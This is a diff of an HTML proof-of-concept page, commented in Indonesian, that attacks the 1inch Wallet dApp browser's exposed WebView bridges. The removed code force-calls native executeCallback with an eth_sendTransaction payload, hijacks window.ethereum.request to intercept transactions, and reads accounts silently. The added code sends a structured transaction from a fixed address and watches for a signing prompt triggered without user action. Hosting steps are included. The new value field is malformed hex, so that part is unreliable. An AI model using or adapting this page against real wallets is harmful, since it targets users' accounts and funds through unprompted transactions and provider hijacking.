@@ -2,10 +2,10 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>1inch Wallet Real-World Exploit PoC</title>
+    <title>1inch Wallet Advanced Bridge Fuzzing PoC</title>
     <script>
         function log(msg, color = "black") {
-            console.log("[Exploit-PoC] " + msg);
+            console.log("[PoC-v18] " + msg);
             const div = document.createElement('div');
             div.style.color = color;
             div.style.margin = "4px 0";
@@ -17,90 +17,55 @@
             document.body.prepend(div);
         }
 
-        // 1. Eksploitasi Paksa / Forced Execution pada OneInchIOSWallet & SolanaWallet
-        function attackNativeBridges() {
-            log("[*] Memulai serangan injeksi dan pemanggilan paksa pada native bridges...", "blue");
+        // Fungsi untuk menguji eksekusi executeCallback dengan struktur objek transaksi valid
+        function testValidTransactionPayload() {
+            log("[*] Mempersiapkan struktur payload transaksi yang valid...", "blue");
 
-            // Coba panggil executeCallback dengan parameter kosong/malformed untuk melihat error handling native
-            if (window.OneInchIOSWallet) {
+            if (window.OneInchIOSWallet && typeof window.OneInchIOSWallet.executeCallback === 'function') {
                 try {
-                    log("[*] Mencoba memaksa eksekusi window.OneInchIOSWallet.executeCallback()...", "orange");
-                    if (typeof window.OneInchIOSWallet.executeCallback === 'function') {
-                        // Memasukkan payload uji coba untuk memicu celah logika callback
-                        window.OneInchIOSWallet.executeCallback({
-                            id: Date.now(),
+                    // Menyusun struktur argumen yang menyerupai parameter transaksi asli
+                    const validTxPayload = {
+                        id: Date.now(),
+                        name: "eth_sendTransaction",
+                        object: {
                             method: "eth_sendTransaction",
                             params: [{
+                                from: "0xDDf9d60E588acE13307ac1828d7DE211B4Ef949A",
                                 to: "0x000000000000000000000000000000000000dead",
-                                value: "0xde0b6b3a7640000" // 1 ETH
+                                value: "0x387371c63raw000", // Contoh nilai transfer
+                                data: "0x"
                             }]
-                        });
-                        log("🚨 Berhasil memanggil executeCallback IOS tanpa validasi ketat!", "#d00");
-                    }
+                        }
+                    };
+
+                    log("[*] Mengirimkan payload terstruktur ke window.OneInchIOSWallet.executeCallback...", "orange");
+                    window.OneInchIOSWallet.executeCallback(validTxPayload);
+                    log("🚨 Berhasil mengeksekusi callback dengan payload terstruktur! Perhatikan layar HP Anda.", "#d00");
                 } catch (e) {
-                    log("[-] Gagal memanggil executeCallback IOS: " + e.message, "gray");
+                    log("[-] Gagal mengeksekusi payload: " + e.message, "gray");
                 }
-            }
-
-            if (window.OneInchSolanaWallet) {
-                try {
-                    log("[*] Mencoba memaksa eksekusi window.OneInchSolanaWallet.executeCallback()...", "orange");
-                    if (typeof window.OneInchSolanaWallet.executeCallback === 'function') {
-                        window.OneInchSolanaWallet.executeCallback({
-                            method: "signAndSendTransaction",
-                            params: { dummy: true }
-                        });
-                        log("🚨 Berhasil memanggil executeCallback Solana!", "#d00");
-                    }
-                } catch (e) {
-                    log("[-] Gagal memanggil executeCallback Solana: " + e.message, "gray");
-                }
-            }
-        }
-
-        // 2. Hooking & Method Hijacking pada window.ethereum.request
-        function hijackEthereumProvider() {
-            if (window.ethereum && typeof window.ethereum.request === 'function') {
-                const originalRequest = window.ethereum.request;
-                log("[*] Menangkap dan menghubungkan ulang (hijacking) window.ethereum.request...", "blue");
-
-                window.ethereum.request = async function(args) {
-                    log(`🚨 INTERCEPTED eth request method: ${args.method}`, "#d00");
-                    if (args.params) {
-                        log(`    Params: ${JSON.stringify(args.params).substring(0, 100)}`, "purple");
-                    }
-                    
-                    // Anda bisa mencoba memodifikasi argumen transaksi di sini secara langsung (Man-in-the-Browser Simulation)
-                    return originalRequest.apply(this, arguments);
-                };
-
-                // Paksa panggil permintaan akun secara otomatis tanpa klik pengguna (Silent Account Enumeration)
-                window.ethereum.request({ method: 'eth_accounts' }).then(accounts => {
-                    log(`[+] Berhasil mengambil akun secara diam-diam: ${JSON.stringify(accounts)}`, "green");
-                }).catch(err => {
-                    log(`[-] Gagal otomatis ambil akun (Dilindungi prompt): ${err.message}`, "orange");
-                });
+            } else {
+                log("[-] window.OneInchIOSWallet.executeCallback tidak ditemukan.", "gray");
             }
         }
 
         window.onload = function() {
-            log("=== Real-World PoC Loaded ===");
-            setTimeout(attackNativeBridges, 1500);
-            setTimeout(hijackEthereumProvider, 2000);
+            log("=== PoC v18 Loaded ===");
+            setTimeout(testValidTransactionPayload, 2000);
         };
     </script>
 </head>
-<body style="padding:15px; font-family:Arial; background-color: #fff0f0;">
-    <h3 style="color: #d00; margin-top:0;">1inch Wallet Exploit PoC (Real-World Test)</h3>
-    <p style="color: #333; font-size: 13px;">Skrip ini mencoba melakukan pemanggilan fungsi secara langsung (*forced execution*) dan *method hijacking* pada objek jembatan yang terekspos.</p>
+<body style="padding:15px; font-family:Arial; background-color: #fff8f8;">
+    <h3 style="color: #c00; margin-top:0;">1inch Advanced Bridge Fuzzing PoC</h3>
+    <p style="color: #333; font-size: 13px;">Menguji apakah fungsi jembatan merespons struktur objek transaksi lengkap dan memicu jendela dialog penandatanganan.</p>
     <hr style="border:0; border-top:1px solid #cc0000; margin:10px 0;">
     
     <div style="background: #fff; padding: 10px; border: 1px solid #ffcccc; border-radius: 4px; margin-top: 10px;">
-        <h4 style="margin: 0 0 8px 0; color: #990000;">Panduan Eksekusi Nyata:</h4>
+        <h4 style="margin: 0 0 8px 0; color: #990000;">Instruksi Pengujian:</h4>
         <ol style="margin: 0; padding-left: 20px; font-size: 13px; color: #444;">
-            <li>Unggah skrip ini ke server Anda yang dapat diakses secara publik (HTTPS wajib).</li>
-            <li>Buka URL tersebut langsung dari dalam **dApp Browser** aplikasi 1inch Wallet.</li>
-            <li>Perhatikan log di layar: Jika fungsi `executeCallback` berjalan tanpa memicu proteksi *native*, atau fungsi `eth_accounts` memberikan data akun secara senyap, ini menjadi bukti kerentanan logika pada jembatan WebView.</li>
+            <li>Unggah skrip ini ke server Anda yang dapat diakses melalui HTTPS.</li>
+            <li>Buka halaman melalui dApp browser aplikasi 1inch Wallet.</li>
+            <li>Amati apakah aplikasi tiba-tiba menampilkan pop-up konfirmasi transaksi (*signing prompt*) tanpa interaksi tombol dari Anda.</li>
         </ol>
     </div>
 </body>
